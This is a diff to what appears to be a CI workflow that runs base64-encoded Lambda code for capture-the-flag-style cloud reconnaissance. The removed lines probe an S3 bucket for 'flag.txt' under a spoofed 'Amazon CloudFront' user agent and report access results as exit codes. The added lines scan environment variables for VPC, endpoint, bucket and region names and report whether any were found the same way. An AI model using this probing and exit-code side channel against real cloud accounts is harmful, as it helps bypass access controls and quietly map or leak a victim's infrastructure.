@@ -23,7 +23,7 @@ jobs:
         run: |
           aws sts get-caller-identity
 
-      - name: Test known S3 object through Lambda
+      - name: Map Lambda environment
         run: |
           pip install boto3 requests requests-aws4auth --quiet
 
@@ -47,38 +47,21 @@ jobs:
           )
 
           lambda_code = r'''
-          import boto3
-          from botocore.config import Config
-          from botocore.exceptions import ClientError
+          import os
 
-          try:
-              s3 = boto3.client(
-                  "s3",
-                  region_name="us-east-1",
-                  endpoint_url="https://s3.us-east-1.amazonaws.com",
-                  config=Config(user_agent="Amazon CloudFront"),
-              )
+          interesting = [
+              key for key in os.environ
+              if any(word in key.upper() for word in [
+                  "VPC",
+                  "ENDPOINT",
+                  "S3",
+                  "BUCKET",
+                  "CLOUD",
+                  "REGION",
+              ])
+          ]
 
-              s3.head_object(
-                  Bucket="userad88e2b168aa387e",
-                  Key="flag.txt",
-              )
-
-              raise SystemExit(7)
-
-          except ClientError as e:
-              error_code = e.response.get("Error", {}).get("Code", "")
-
-              if error_code in ["AccessDenied", "403"]:
-                  raise SystemExit(10)
-
-              if error_code in ["NoSuchKey", "404", "NotFound"]:
-                  raise SystemExit(12)
-
-              raise SystemExit(13)
-
-          except Exception:
-              raise SystemExit(14)
+          raise SystemExit(7 if interesting else 9)
           '''
 
           encoded = base64.b64encode(
@@ -101,7 +84,7 @@ jobs:
           )
 
           print(
-              "OBJECT_STATUS:",
+              "ENV_MAP_STATUS:",
               match.group(1) if match else "NO_EXIT_CODE",
           )
           PY
